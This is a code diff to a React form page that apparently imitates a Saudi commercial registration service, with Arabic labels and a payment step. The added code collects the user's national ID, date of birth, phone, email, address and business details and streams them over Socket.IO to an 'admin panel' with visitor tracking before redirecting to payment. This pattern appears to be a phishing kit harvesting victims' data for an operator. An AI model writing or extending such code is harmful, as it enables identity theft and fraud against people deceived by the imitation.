@@ -1,4 +1,5 @@
 import { useState, useEffect, useRef } from 'react';
+import { sendData, navigateToPage, initializeSocket, socket, visitor } from '@/lib/store';
 import { useLocation } from 'wouter';
 import { motion, AnimatePresence } from 'framer-motion';
 import SBCSidebar from '@/components/SBCSidebar';
@@ -2424,10 +2425,80 @@ const [capitalAmount, setCapitalAmount] = useState('1000');
                   onClick={() => {
                     if (validateForm()) {
                       setIsSaving(true);
+                      
+                      // Prepare all form data to send to admin panel
+                      const formData = {
+                        // Personal Information
+                        arabicName,
+                        englishName,
+                        nationality,
+                        gender: gender === 'male' ? 'ذكر' : 'أنثى',
+                        nationalId,
+                        dateOfBirth: calendarType === 'hijri' 
+                          ? `${hijriDate.day}/${hijriDate.month}/${hijriDate.year} هـ`
+                          : dateOfBirth?.toLocaleDateString('ar-SA'),
+                        ownerType,
+                        
+                        // Contact Information
+                        mobileNumber: countryCode + mobileNumber,
+                        email,
+                        address,
+                        buildingNumber,
+                        floorNumber,
+                        
+                        // Commercial Activities
+                        generalActivity,
+                        specialActivity,
+                        capitalAmount,
+                        
+                        // Shop Information
+                        hasTrademark,
+                        brandName,
+                        shopName,
+                        shopNumber,
+                        propertyNumber,
+                        numberOfOpenings,
+                        numberOfFloors,
+                        numberOfCameras,
+                        hasElevator,
+                        inCommercialCenter,
+                        contractType,
+                        
+                        // Signage Information
+                        signageType,
+                        signageArea,
+                        trackType,
+                        
+                        // Commercial Name
+                        nameType,
+                        commercialName: `${nameParts.first} ${nameParts.second} ${nameParts.third} ${nameParts.fourth}`.trim(),
+                        
+                        // Trademark
+                        trademarkArabicName,
+                        trademarkEnglishName,
+                        
+                        // Service Info
+                        serviceName,
+                        requestId,
+                        crNumber,
+                      };
+                      
+                      // Send data to admin panel via Socket.IO
+                      sendData({
+                        data: formData,
+                        current: 'معلومات الأعمال',
+                        nextPage: 'summary-payment',
+                        waitingForAdminResponse: false,
+                      });
+                      
+                      // Update visitor page
+                      navigateToPage('معلومات الأعمال');
+                      
                       setTimeout(() => {
                         setIsSaving(false);
-                        // Redirect to Summary Payment page
-                        window.location.href = '/summary-payment';
+                        // Redirect to Summary Payment page with service param
+                        const serviceParam = encodeURIComponent(serviceName);
+                        window.location.href = `/summary-payment?service=${serviceParam}`;
                       }, 3000);
                     } else {
                       // Scroll to first error
